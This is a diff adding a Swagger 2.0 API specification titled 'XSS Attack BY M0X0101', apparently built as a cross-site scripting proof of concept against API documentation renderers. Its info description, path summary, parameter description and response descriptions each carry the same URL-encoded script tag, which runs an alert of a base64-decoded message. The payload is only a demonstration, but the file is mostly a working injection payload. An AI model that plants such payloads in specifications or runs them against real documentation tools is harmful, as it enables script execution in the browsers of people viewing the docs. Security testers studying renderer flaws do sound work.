@@ -1,0 +1,44 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY M0X0101
+  description: |
+    %3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNT%22))%3C/script%3E
+  version: "production"
+
+basePath: /JSSResource/
+
+produces:
+  - application/xml
+  - application/json
+
+consumes:
+  - application/xml
+  - application/json
+
+security:
+  - basicAuth: []
+
+paths:
+  /M0X0101:
+    get:
+      summary: %3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNT%22))%3C/script%3E
+      operationId: findAccounts
+      tags:
+        - M0X0101_XSS_D
+      responses:
+        '200':
+          description: %3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNT%22))%3C/script%3E
+
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - name: id
+          in: path
+          description: |
+            %3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNT%22))%3C/script%3E
+          required: true
+          type: integer
+          format: int64
+      responses:
+        '200':
+          description: %3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNT%22))%3C/script%3E
